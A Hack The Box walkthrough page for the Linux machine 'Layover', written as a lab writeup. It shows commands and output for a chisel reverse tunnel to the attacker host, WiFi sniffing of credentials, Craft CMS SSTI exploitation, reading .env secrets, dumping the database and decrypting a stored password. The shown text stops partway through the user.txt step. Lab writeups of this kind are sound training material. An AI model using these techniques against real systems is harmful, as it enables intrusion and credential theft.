@@ -1,0 +1,864 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#f8fafc" />
+    <title>HTB: Layover — Hack The Box writeup · Bintang Fajar Putera Faza</title>
+    <meta
+      name="description"
+      content="Walkthrough of the Hack The Box machine Layover (Linux, Medium): a contractor RDP login, an internal WiFi portal, Wireshark-captured credentials, Craft CMS SSTI, and a CUPS privilege escalation to root."
+    />
+    <meta name="author" content="Bintang Fajar Putera Faza" />
+
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB: Layover — Hack The Box writeup" />
+    <meta
+      property="og:description"
+      content="Linux/Medium HTB machine: contractor RDP access, internal WiFi recon, a Craft CMS SSTI, and CUPS token coercion to root."
+    />
+    <meta name="twitter:card" content="summary" />
+
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
+    <link rel="canonical" href="https://portofolio.bintangfajar.my.id/writeups/layover.html" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../styles.css" />
+    <link rel="stylesheet" href="../writeups.css" />
+
+    <script>
+      (function () {
+        var root = document.documentElement;
+        root.classList.add('js');
+        try {
+          var saved = localStorage.getItem('theme');
+          var prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+          var theme = saved === 'light' || saved === 'dark' ? saved : prefersDark ? 'dark' : 'light';
+          root.setAttribute('data-theme', theme);
+        } catch (e) {}
+      })();
+    </script>
+  </head>
+  <body>
+    <a class="skip-link" href="#main-content">Skip to content</a>
+
+    <header class="navbar" id="navbar">
+      <div class="navbar__inner">
+        <a class="brand" href="../index.html" aria-label="Bintang Fajar Putera Faza — home">
+          <span class="brand__mark" aria-hidden="true">B</span>
+          <span class="brand__text">Bintang Fajar</span>
+        </a>
+
+        <nav class="nav" id="nav" aria-label="Primary">
+          <ul class="nav__list">
+            <li><a class="nav__link" href="../index.html#about">About</a></li>
+            <li><a class="nav__link" href="../index.html#experience">Experience</a></li>
+            <li><a class="nav__link" href="../index.html#projects">Projects</a></li>
+            <li><a class="nav__link" href="../index.html#pipeline">Pipeline</a></li>
+            <li><a class="nav__link" href="../index.html#writeups">Writeups</a></li>
+            <li><a class="nav__link" href="../index.html#organization">Organization</a></li>
+            <li><a class="nav__link" href="../index.html#education">Education</a></li>
+            <li><a class="nav__link" href="../index.html#skills">Skills</a></li>
+            <li><a class="nav__link" href="../index.html#contact">Contact</a></li>
+          </ul>
+        </nav>
+
+        <div class="navbar__actions">
+          <button
+            class="icon-btn"
+            id="theme-toggle"
+            type="button"
+            aria-label="Toggle color theme"
+            title="Toggle color theme"
+          >
+            <svg class="icon icon--moon" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+              <path
+                d="M21.64 13a1 1 0 0 0-1.05-.14 8.05 8.05 0 0 1-3.37.73 8.15 8.15 0 0 1-8.14-8.1 8.59 8.59 0 0 1 .25-2A1 1 0 0 0 8 2.36a10.14 10.14 0 1 0 14 11.69 1 1 0 0 0-.36-1.05Z"
+              />
+            </svg>
+            <svg class="icon icon--sun" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+              <path
+                d="M12 17a5 5 0 1 0 0-10 5 5 0 0 0 0 10Zm0 3a1 1 0 0 1 1 1v1a1 1 0 0 1-2 0v-1a1 1 0 0 1 1-1Zm0-20a1 1 0 0 1 1 1v1a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1Zm11 11a1 1 0 0 1-1 1h-1a1 1 0 0 1 0-2h1a1 1 0 0 1 1 1ZM4 12a1 1 0 0 1-1 1H2a1 1 0 0 1 0-2h1a1 1 0 0 1 1 1Zm14.66-6.66a1 1 0 0 1 1.42 0 1 1 0 0 1 0 1.41l-.71.71a1 1 0 0 1-1.41-1.42l.7-.7Zm-13.32 0 .71.7A1 1 0 0 1 6.64 7.46a1 1 0 0 1-1.41 0l-.71-.71a1 1 0 0 1 1.42-1.41ZM12 19a1 1 0 0 1 1 1v1a1 1 0 0 1-2 0v-1a1 1 0 0 1 1-1Zm0-17a1 1 0 0 1 1 1v1a1 1 0 0 1-2 0V3a1 1 0 0 1 1-1Zm8.66 15.66a1 1 0 0 1 0 1.41l-.7.71a1 1 0 0 1-1.42-1.42l.71-.7a1 1 0 0 1 1.41 0ZM4.05 4.34a1 1 0 0 1 0 1.41l-.71.71A1 1 0 0 1 1.93 5.05l.7-.71a1 1 0 0 1 1.42 0Z"
+                transform="translate(0 1)"
+              />
+            </svg>
+          </button>
+
+          <button
+            class="icon-btn nav-toggle"
+            id="nav-toggle"
+            type="button"
+            aria-label="Open navigation menu"
+            aria-expanded="false"
+            aria-controls="nav"
+            title="Menu"
+          >
+            <svg class="icon icon--menu" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+              <path
+                d="M4 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2Zm0 5h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2Zm0 5h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2Z"
+              />
+            </svg>
+            <svg class="icon icon--close" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+              <path
+                d="M6.4 5a1 1 0 0 1 1.4 0L12 9.2 16.2 5a1 1 0 1 1 1.4 1.4L13.4 10.6l4.2 4.2a1 1 0 0 1-1.4 1.4L12 12l-4.2 4.2a1 1 0 0 1-1.4-1.4l4.2-4.2L6.4 6.4A1 1 0 0 1 6.4 5Z"
+              />
+            </svg>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <main id="main-content" tabindex="-1" class="article">
+      <div class="page-glow page-glow--fixed" aria-hidden="true">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <nav class="crumbs" aria-label="Breadcrumb">
+        <a href="../index.html#writeups">Writeups</a>
+        <span class="crumbs__sep" aria-hidden="true">/</span>
+        <span aria-current="page">Layover</span>
+      </nav>
+
+      <header class="article__header reveal">
+        <p class="section__label">Hack The Box · Walkthrough</p>
+        <h1 class="article__title">Layover</h1>
+        <p class="article__lead">
+          A Linux Medium box that hands you a single contractor login and then quietly lets that
+          contractor become root on the WiFi workstation. From there it is a monitor-mode sniff for
+          <strong>Jenny</strong>'s credentials, a <strong>Craft CMS</strong> SSTI for the first
+          shell, and a <strong>CUPS</strong> token-coercion privesc all the way to root.
+        </p>
+        <div class="article__meta">
+          <span class="diff diff--medium">Medium</span>
+          <span class="chip">Linux</span>
+          <span class="chip">Author · TRX</span>
+        </div>
+      </header>
+
+      <figure class="machine-card reveal">
+        <div class="machine-card__bar">
+          <span class="machine-card__path">user@htb: ~/Layover</span>
+          <span class="machine-card__dots" aria-hidden="true"><i></i><i></i><i></i></span>
+        </div>
+        <div class="machine-card__body">
+          <p class="machine-card__prompt">
+            <span class="u">user@htb</span>:<span class="p">~/Layover</span>$ cat machine.info
+          </p>
+          <div class="machine-card__grid">
+            <img
+              class="machine-card__avatar"
+              src="../assets/writeups/layover/avatar.png"
+              alt="Hack The Box machine “Layover” avatar"
+              width="118"
+              height="118"
+            />
+            <dl class="machine-card__info">
+              <div><dt>Machine</dt><dd>Layover</dd></div>
+              <div><dt>OS</dt><dd>Linux</dd></div>
+              <div><dt>Difficulty</dt><dd>Medium</dd></div>
+              <div><dt>Author</dt><dd>TRX</dd></div>
+            </dl>
+          </div>
+          <p class="machine-card__note">
+            Because this is supposed to feel like a real pentest, you don't start with a shell. You
+            start with credentials — and that's the whole starting kit.
+          </p>
+          <p class="machine-card__creds">
+            <span class="u">contractor</span> / <span class="p">Contractor2026!</span>
+          </p>
+          <p class="machine-card__prompt">
+            <span class="u">user@htb</span>:<span class="p">~/Layover</span>$
+            <span class="machine-card__cursor">█</span>
+          </p>
+        </div>
+      </figure>
+
+      <article class="prose-article">
+        <h2 id="recon">Reconnaissance</h2>
+        <p>
+          Nmap's first pass found exactly two ports and made the box look polite:
+        </p>
+        <pre><code>marauder@forttablazed:~$ nmap -p 1-10000 10.129.59.235
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-22 19:10 WIB
+Nmap scan report for 10.129.59.235
+Host is up (0.031s latency).
+Not shown: 9998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 59.98 seconds
+marauder@forttablazed:~$ nmap -p 22,3389 -sCV 10.129.59.235
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-22 19:12 WIB
+Nmap scan report for 10.129.59.235
+Host is up (0.048s latency).
+
+PORT     STATE    SERVICE       VERSION
+22/tcp   filtered ssh
+3389/tcp filtered ms-wbt-server
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.74 seconds</code></pre>
+        <p>
+          Then I ran version detection on those same two ports and suddenly both were
+          <code>filtered</code>. Same box, same minute, completely different story. Welcome to
+          Layover, I guess.
+        </p>
+
+        <h2 id="contractor">Getting In as Contractor</h2>
+
+        <h3>SSH Access</h3>
+        <p>SSH was not interested. Three password attempts, three rejections:</p>
+        <pre><code>marauder@forttablazed:~$ ssh contractor@10.129.59.235
+The authenticity of host '10.129.59.235 (10.129.59.235)' can't be established.
+ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:12: [hashed name]
+    ~/.ssh/known_hosts:13: [hashed name]
+    ~/.ssh/known_hosts:15: [hashed name]
+    ~/.ssh/known_hosts:18: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.59.235' (ED25519) to the list of known hosts.
+contractor@10.129.59.235's password:
+Permission denied, please try again.
+contractor@10.129.59.235's password:
+Permission denied, please try again.
+contractor@10.129.59.235's password:
+contractor@10.129.59.235: Permission denied (publickey,password).</code></pre>
+
+        <h3>RDP Access</h3>
+        <p>
+          RDP, though? RDP on a Linux box let me straight in as contractor. I'm still a little
+          surprised — Linux + RDP is a combo you don't see every day.
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/rdp-session.png"
+            alt="RDP session to the Layover box logged in as contractor"
+            width="1039"
+            height="821"
+            loading="lazy"
+            decoding="async"
+          />
+          <figcaption>Desktop as contractor — note the blank WiFi icon in the corner.</figcaption>
+        </figure>
+
+        <h2 id="www-data">Shell as www-data</h2>
+
+        <h3>Initial Enumeration</h3>
+        <h4>Discovering the Internal Network</h4>
+        <p>
+          The little WiFi icon in the corner was blank, which felt like the box winking at me.
+          Plugged it into <code>HTB International Wifi</code> and it handed out an IP:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/wifi-connect.png"
+            alt="Connecting the workstation to HTB International Wifi"
+            width="542"
+            height="361"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>
+          Right after connecting, a browser pops up out of nowhere on
+          <code>http://wifi.international.htb/</code>:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/wifi-captive-portal.png"
+            alt="Captive portal at wifi.international.htb"
+            width="1010"
+            height="728"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>
+          Hit <code>agree</code>, and it drops you at
+          <code>http://portal.international.htb/</code>:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/portal-login.png"
+            alt="Portal login page at portal.international.htb"
+            width="1010"
+            height="728"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>That domain resolves to <code>10.13.37.10</code> — and yes, it actually pings:</p>
+        <pre><code>contractor@airside-ws01:~$ ping -c 3 portal.international.htb
+PING portal.international.htb (10.13.37.10) 56(84) bytes of data.
+64 bytes from portal.international.htb (10.13.37.10): icmp_seq=1 ttl=64 time=0.064 ms
+64 bytes from portal.international.htb (10.13.37.10): icmp_seq=2 ttl=64 time=0.196 ms
+64 bytes from portal.international.htb (10.13.37.10): icmp_seq=3 ttl=64 time=0.164 ms
+
+--- portal.international.htb ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2001ms
+rtt min/avg/max/mdev = 0.064/0.141/0.196/0.056 ms</code></pre>
+
+        <h4>Contractor Has Root Access</h4>
+        <p>
+          Tiny detail I almost missed: contractor can just <code>sudo su</code>. No exploit, no
+          cleverness, just vibes:
+        </p>
+        <pre><code>contractor@airside-ws01:~$ sudo su
+[sudo] password for contractor:
+root@airside-ws01:/home/contractor# whoami
+root
+root@airside-ws01:/home/contractor#</code></pre>
+
+        <h3>Enumeration with Chisel</h3>
+        <p>
+          Time to tunnel, because I want to actually see inside <code>international.htb</code>.
+          Chisel server goes up on my attacker box:
+        </p>
+        <pre><code>marauder@forttablazed:/home/fortta/Documents/tools$ ./chisel server --reverse -v -p 12345 --socks5
+2026/10/22 19:26:25 server: Reverse tunnelling enabled
+2026/10/22 19:26:25 server: Fingerprint MIInFIYyZbKI7cil7egMCnH7K1h1iaara2Sbz5UfBvs=
+2026/10/22 19:26:25 server: Listening on http://0.0.0.0:12345
+2026/10/22 19:30:36 server: session#1: Handshaking with 10.129.59.235:56308...
+2026/10/22 19:30:37 server: session#1: Verifying configuration
+2026/10/22 19:30:37 server: session#1: Open (user=- addr=10.129.59.235:56308 remotes=R:127.0.0.1:1080:socks)
+2026/10/22 19:30:37 server: session#1: tun: Created (SOCKS enabled)
+2026/10/22 19:30:37 server: session#1: tun: SSH connected
+2026/10/22 19:30:37 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
+2026/10/22 19:30:37 server: tun: Bound proxies</code></pre>
+        <p>And the client runs on the victim:</p>
+        <pre><code>contractor@airside-ws01:~$ ./chisel client 10.10.15.62:12345 R:socks
+2026/10/22 12:29:23 client: Connecting to ws://10.10.15.62:12345
+2026/10/22 12:29:25 client: Connected (Latency 55.337606ms)</code></pre>
+
+        <h4>Port Scanning via Proxychains</h4>
+        <p>
+          I scanned 1–10000 in three chunks (<code>1–1000</code>, <code>1001–5000</code>,
+          <code>5001–10000</code>) because proxychains makes every packet feel like it's being
+          delivered by hand. Time was tight, so I split the work. End result: exactly two ports on
+          <code>international.htb</code>.
+        </p>
+        <pre><code>Nmap scan report for portal.international.htb (10.13.37.10)
+Host is up (1.3s latency).
+Not shown: 98 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 177.73 seconds</code></pre>
+
+        <h3>Web Enumeration</h3>
+        <p>Firefox + SOCKS proxy = comfy browsing:</p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/firefox-socks.png"
+            alt="Firefox configured to browse through the SOCKS proxy"
+            width="1920"
+            height="341"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>
+          The portal has a login page, so I tried contractor. The dashboard had absolutely nothing
+          useful — checked the source code too, still nothing:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/portal-dashboard.png"
+            alt="Portal dashboard after logging in as contractor"
+            width="1030"
+            height="869"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>
+          Dirsearch turned up a Craft CMS admin login, but no version anywhere and contractor's
+          creds didn't work there either:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/dirsearch-craft-admin.png"
+            alt="Dirsearch results showing the Craft CMS admin login"
+            width="408"
+            height="492"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+
+        <h3>Traffic Sniffing</h3>
+        <h4>Capturing Jenny's Credentials</h4>
+        <p>
+          The box makes you connect to WiFi manually at the start, which is a pretty loud hint that
+          the traffic itself matters. First, let's see what interfaces we're working with:
+        </p>
+        <pre><code>contractor@airside-ws01:~$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.159.143.45  netmask 255.255.255.0  broadcast 10.159.143.255
+        inet6 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::216:3eff:fe83:ea41  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:83:ea:41  txqueuelen 1000  (Ethernet)
+        RX packets 9037  bytes 12241355 (12.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7097  bytes 566721 (566.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 511790  bytes 512443544 (512.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 511790  bytes 512443544 (512.4 MB)
+        TX errors 0  dropped 0 overruns 0  frame 0
+        collisions 0
+
+wlan2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.13.37.182  netmask 255.255.255.0  broadcast 10.13.37.255
+        inet6 fe80::94fc:97d0:9dad:e50b  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 2225  bytes 535163 (535.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5710  bytes 674470 (674.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan3: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0  overruns 0  frame 0
+        collisions 0</code></pre>
+        <p>
+          <code>wlan3</code> is just sitting there with no IP at all — an obvious candidate for a
+          sniffing interface. And this is where I could've been normal about it.
+        </p>
+        <blockquote>
+          🔴 But nah, where's the fun in just grabbing the empty interface and calling it a day? I'm
+          going to pretend <code>wlan3</code> doesn't exist and clone <code>wlan2</code> into a
+          brand-new monitor interface called <code>mon2</code>. Why? Because I can, and because
+          "just use the interface that was conveniently handed to you" is boring. Name it
+          <code>mon11</code>, <code>wlqo1</code>, <code>totallyNotSpyware</code> — doesn't matter,
+          it's just a name.
+        </blockquote>
+        <pre><code>sudo iw dev wlan2 interface add mon2 type monitor</code></pre>
+        <p>Bring it up, then check it's actually alive (spoiler: it is):</p>
+        <pre><code>contractor@airside-ws01:~$ sudo ip link set mon2 up
+contractor@airside-ws01:~$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.159.143.45  netmask 255.255.255.0  broadcast 10.159.143.255
+        inet6 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::216:3eff:fe83:ea41  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:83:ea:41  txqueuelen 1000  (Ethernet)
+        RX packets 9107  bytes 12248650 (12.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7237  bytes 581588 (581.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 552229  bytes 553563985 (553.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 552229  bytes 553563985 (553.5 MB)
+        TX errors 0  dropped 0  overruns 0  frame 0
+        collisions 0
+
+mon2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        unspec 02-00-00-00-02-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 29  bytes 3712 (3.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.13.37.182  netmask 255.255.255.0  broadcast 10.13.37.255
+        inet6 fe80::94fc:97d0:9dad:e50b  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 2359  bytes 567656 (567.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 6077  bytes 716943 (716.9 KB)
+        TX errors 0  dropped 0  overruns 0  frame 0
+        collisions 0
+
+wlan3: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0  overruns 0  frame 0
+        collisions 0</code></pre>
+        <p>
+          Now point Wireshark at <code>mon2</code>, wait a couple of minutes, and the box hands over
+          the goods: <code>username=jenny&amp;password=Fl1ghtDeck2026!</code>
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/wireshark-jenny-creds.png"
+            alt="Wireshark capture showing jenny's username and password in cleartext"
+            width="1039"
+            height="775"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+
+        <h3>Craft CMS 5.9.8 RCE</h3>
+        <p>
+          Jenny's creds get you into Craft CMS, and now the version is right there in your face:
+          <strong>Craft CMS 5.9.8</strong>.
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/craft-version.png"
+            alt="Craft CMS dashboard showing version 5.9.8"
+            width="1805"
+            height="1043"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>
+          That version is vulnerable — pick your CVE. The one I used is
+          <strong>CVE-2026-31857: Remote Code Execution via Relational Conditionals</strong>:
+        </p>
+        <blockquote>
+          Unsanitized user input reaches the unsandboxed <code>renderObjectTemplate()</code>
+          function, triggering template injection and code execution via element listing endpoints.
+        </blockquote>
+        <p>
+          It's basically SSTI with extra steps. And while hunting for a PoC, I found
+          <a
+            href="https://github.com/TRX-0/CVE-2026-31857-craftcms-ssti"
+            target="_blank"
+            rel="noopener noreferrer"
+            >TRX-0/CVE-2026-31857-craftcms-ssti</a
+          >
+          — which I'm 90% sure belongs to the author of this box. Small world. Thanks for the
+          exploit, TRX.
+        </p>
+        <blockquote>
+          🔴 <strong>Fun fact:</strong> my very first RCE shell landed on… my own attacker machine.
+          The victim couldn't reach my IP, so I helpfully reverse-shelled myself. Not my proudest
+          moment, but hey — it worked, just on the wrong machine.
+        </blockquote>
+        <p>After that little detour, we did get a real shell:</p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/www-data-shell.png"
+            alt="Shell on the portal host as www-data"
+            width="1254"
+            height="864"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+
+        <h2 id="aporter">Shell as aporter</h2>
+
+        <h3>Finding the .env File</h3>
+        <p>First order of business: find <code>.env</code>. It's always <code>.env</code>.</p>
+        <pre><code>www-data@portal:~/portal/web$ find / -name .env 2&gt;/dev/null
+/var/www/portal/.env
+www-data@portal:~/portal/web$ cat /var/www/portal/.env
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=production
+
+# General settings
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://portal.international.htb/
+CRAFT_ENABLE_TWIG_SANDBOX=true</code></pre>
+        <p>DB password acquired. Of course it was in there. It always is.</p>
+
+        <h3>Local User Enumeration</h3>
+        <p>Before dumping anything, let's check who actually lives on this box.</p>
+        <pre><code>www-data@portal:~/portal/web$ ls /home -al
+total 12
+drwxr-xr-x  3 root    root    4096 Sep 23 13:14 .
+drwxr-xr-x 21  197108  197121 4096 Sep 23 13:14 ..
+drwxr-x---  3 aporter aporter 4096 Sep 23 13:14 aporter
+www-data@portal:~/portal/web$ ls -al /home/aporter
+ls: cannot open directory '/home/aporter': Permission denied</code></pre>
+        <p>One user: <code>aporter</code>. And of course their home is locked down. Rude.</p>
+
+        <h3>Credential Dumping</h3>
+        <p>The objective is clearly aporter's password, so into the database we go.</p>
+        <pre><code>www-data@portal:~/portal/web$ mysql -u craftuser -p craft
+Enter password: CraftDB_pw_2026
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 79
+Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+MariaDB [craft]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| craft              |
+| information_schema |
++--------------------+
+
+MariaDB [craft]&gt; use craft;
+Database changed
+MariaDB [craft]&gt; show tables;
++----------------------------+
+| Tables_in_craft            |
++----------------------------+
+| ...                        |
+| htbairways_settings        |
+| ...                        |
+| users                      |
++----------------------------+
+
+MariaDB [craft]&gt; select username, password from users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$13$ZdTZwteklJx2.z6sEY35pehuiOsB28y3sGJTNozu.xTpYRe4MCGg2 |
+| jenny    | $2y$13$abHJk/QQLb8BE4L2pkBblebjEeWCMyFAdwguN2d7rDHZnnHJWvG7q |
++----------+--------------------------------------------------------------+</code></pre>
+        <p>
+          No aporter in the <code>users</code> table — just admin and jenny. Interesting. So the move
+          is: dump everything and grep like a caveman.
+        </p>
+        <pre><code>www-data@portal:~$ cd /tmp
+www-data@portal:/tmp$ mysqldump -u craftuser -p craft &gt; craft.sql
+Enter password: CraftDB_pw_2026
+
+www-data@portal:/tmp$ grep -in -B 5 -A 5 aporter craft.sql
+1094-/*!40000 ALTER TABLE `htbairways_settings` DISABLE KEYS */;
+1095-INSERT INTO `htbairways_settings` VALUES
+1096-(1,'mailRelayPassword','u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=','2026-07-16 03:19:52','2026-07-16 03:19:52'),
+1097-(2,'mailRelayHost','mail.htbairways.htb','2026-08-11 13:31:23','2026-08-11 13:31:23'),
+1098-(3,'mailRelayPort','587','2026-08-11 13:31:23','2026-08-11 13:31:23'),
+1099-(4,'mailRelayUser','aporter','2026-08-11 13:31:23','2026-08-11 13:31:23');
+1100-/*!40000 ALTER TABLE `htbairways_settings` ENABLE KEYS */;</code></pre>
+        <p>
+          There's the encrypted <code>mailRelayPassword</code>, sitting right next to the username.
+          Subtle.
+        </p>
+
+        <h3>Decrypting mailRelayPassword</h3>
+        <p>
+          Next question: how do you decrypt this thing? I asked the AI overlords, and they pointed me
+          at Craft's own <code>yii\base\Security</code> class plus the
+          <code>CRAFT_SECURITY_KEY</code> from <code>.env</code>:
+        </p>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/decrypt-script.png"
+            alt="Yii Security decryptByKey snippet used to decrypt the stored password"
+            width="671"
+            height="709"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+        <p>Ran it, and out came <code>Skyp0rt_Relay!26</code>:</p>
+        <pre><code>www-data@portal:~/portal$ php -r '
+require "/var/www/portal/vendor/autoload.php";
+$s = new yii\base\Security();
+$key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr";
+$blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=";
+echo $s-&gt;decryptByKey(base64_decode($blob), $key) . "\n";
+'
+Skyp0rt_Relay!26</code></pre>
+
+        <h3>user.txt</h3>
+        <p>
+          And that's aporter's password. <code>su</code> later, password accepted, and the box
+          finally gives you something nice:
+        </p>
+        <pre><code>www-data@portal:~/portal$ su aporter
+Password: Skyp0rt_Relay!26
+
+aporter@portal:/var/www/portal$ whoami
+aporter
